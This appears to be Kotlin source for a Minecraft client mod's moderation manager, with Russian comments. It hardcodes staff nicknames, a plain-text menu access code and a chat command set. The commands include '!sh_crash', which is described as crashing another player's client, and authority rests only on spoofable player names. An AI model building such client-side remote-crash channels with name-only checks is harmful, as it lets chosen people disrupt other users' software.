package set.starlev.features.chat.mod

import net.minecraft.client.Minecraft
import net.minecraft.network.chat.Component

object ModerationManager {
    /**
     * Владелец — высший ранг. Только он может действовать над другими админами
     * (в т.ч. над самым собой за исключением self-гара).
     */
    private val owners = setOf("Starlev", "Starlevka")

    /** Админы — ТОЛЬКО ники, не ранги. Ранги вроде «Owner»/«Penguin» сюда попадать не должны:
     *  иначе isAdmin() почти всегда false и проверка «модер не трогает админа» не срабатывает. */
    private val admins = setOf("Starlev", "Starlevka", "MegaChromeX", "ZurGames")

    private val moderators = setOf(
        "NiKoMao", "grustam46", "Timyr12",
        "nik36c", "Tasik12", "maksimwain",
        // MegaChromeX и ZurGames повышены до админов — остались в списке модераторов,
        // т.к. isAdmin() = true делает isModerator() = true автоматически.
        "MegaChromeX", "ZurGames"
    )
    private val muted = mutableMapOf<String, MuteData>()
    private var localMuted: MuteData? = null

    /** Адрес последнего сервера — чтобы не терять мут при реконнекте на тот же сервер. */
    private var lastServerIp: String? = null

    /**
     * Вызывается на JOIN. Мут обнуляется ТОЛЬКО при переходе на другой сервер;
     * перезаход на тот же сервер мут сохраняет (иначе бан слетает при реконнекте).
     */
    fun onJoin(serverIp: String?) {
        if (!serverIp.equals(lastServerIp, ignoreCase = true)) {
            localMuted = null
            muted.clear()
        }
        lastServerIp = serverIp
    }

    /** DISCONNECT: сервер мог смениться — сверяем адрес, но мут пока держим до следующего JOIN. */
    fun onDisconnect() {
        lastServerIp = Minecraft.getInstance().currentServer?.ip ?: lastServerIp
    }

    /** Полный сброс (например, при выходе в меню). */
    fun reset() {
        localMuted = null
        muted.clear()
        lastServerIp = null
    }

    fun isOwner(player: String) = owners.contains(player)
    fun isAdmin(player: String) = admins.contains(player) || isOwner(player)
    fun isModerator(player: String) = moderators.contains(player) || isAdmin(player)

    /**
     * Проверяет, может ли mod совершить действие над target.
     *
     * Иерархия: owner > admin > moderator.
     * - себя нельзя мутить/кикать/крашить НИКОГДА, даже owner'у;
     * - owner может всё над кем угодно;
     * - никто ниже owner не может трогать админа (даже другой админ).
     */
    fun canPerformAction(mod: String, target: String): Boolean {
        if (mod.equals(target, ignoreCase = true)) return false
        if (isOwner(mod)) return true
        if (isAdmin(target)) return false
        return isModerator(mod)
    }

    /**
     * Список команд, доступных модераторам.
     * Админы имеют доступ ко всем командам.
     * Держим в паре с [isModeratorCommand] — раньше они расходились (sh_crash был только во втором).
     */
    private val moderatorCommands = setOf("sh_mute", "sh_kick", "sh_unmute", "sh_mc", "sh_unmc", "sh_crash")

    fun isCommandAllowed(mod: String, command: String): Boolean {
        if (isAdmin(mod)) return true
        // isModerator(mod) обязателен: раньше тут стоял только contains(command), из-за чего
        // любой не-админ формально проходил проверку (спасло лишь то, что вызов идёт из
        // handle*Command уже после isModerator(player)).
        return isModerator(mod) && moderatorCommands.contains(command.lowercase())
    }

    /**
     * Человекочитаемый список команд по рангу — для приветствия персонала и раздела
     * «Команды модерации» в секретном меню. Держим здесь, чтобы тексты не расходились.
     */
    fun commandsFor(player: String): List<String> {
        val list = mutableListOf<String>()
        if (!isModerator(player)) return list
        list += "§e!sh_mute §7[игрок] [время] [причина] §8— мут"
        list += "§e!sh_unmute §7[игрок] §8— снять мут"
        list += "§e!sh_kick §7[игрок] [причина] §8— кик"
        list += "§e!sh_mc §7[игрок] §8— проверка на макрос"
        list += "§e!sh_unmc §7[игрок] §8— отменить проверку"
        list += "§e!sh_crash §7[игрок] §8— крашнуть клиент"
        return list
    }

    /** Отображаемое имя ранга для приветствий и меню. */
    fun rankName(player: String): String = when {
        isOwner(player) -> "§4§lВладелец"
        isAdmin(player) -> "§c§lАдминистратор"
        isModerator(player) -> "§2§lМодератор"
        else -> "§7§lИгрок"
    }

    /** Секретный код доступа к меню. Показывается персоналу при заходе. */
    const val SECRET_CODE: String = "lomo4ka"

    fun mute(target: String, mod: String, duration: String, reason: String) {
        // Дублируем проверку self-мута: вызывающий код уже фильтрует, но это дешёвая страховка.
        if (mod.equals(target, ignoreCase = true)) return
        val data = MuteData(mod, duration, reason, System.currentTimeMillis())
        if (target.equals(Minecraft.getInstance().player?.name?.string, ignoreCase = true)) {
            localMuted = data
            Minecraft.getInstance().player?.sendSystemMessage(Component.literal("§c§l[MUTE] §fВы были временно заблокированы в чате модератором §e$mod\n§fВремя: §b$duration\n§fПричина: §7$reason"))
        }
        muted[target.lowercase()] = data
    }

    fun unmute(target: String): Boolean {
        if (target.equals(Minecraft.getInstance().player?.name?.string, ignoreCase = true)) {
            localMuted = null
            Minecraft.getInstance().player?.sendSystemMessage(Component.literal("§a§l[MUTE] §fВаша блокировка чата была снята."))
        }
        return muted.remove(target.lowercase()) != null
    }

    fun isLocalMuted(): Boolean = localMuted != null

    fun getLocalMuteData(): MuteData? = localMuted

    fun isMuted(player: String) = muted.containsKey(player.lowercase())

    /**
     * Проверяет, является ли сообщение командой модератора (разрешённой при муте).
     * Список держим в паре с [moderatorCommands] — раньше они расходились.
     */
    fun isModeratorCommand(lowerMsg: String): Boolean {
        if (!lowerMsg.startsWith("!")) return false
        val cmd = lowerMsg.substringBefore(" ").lowercase().removePrefix("!")
        return moderatorCommands.contains(cmd)
    }

    data class MuteData(val mod: String, val duration: String, val reason: String, val time: Long)
}
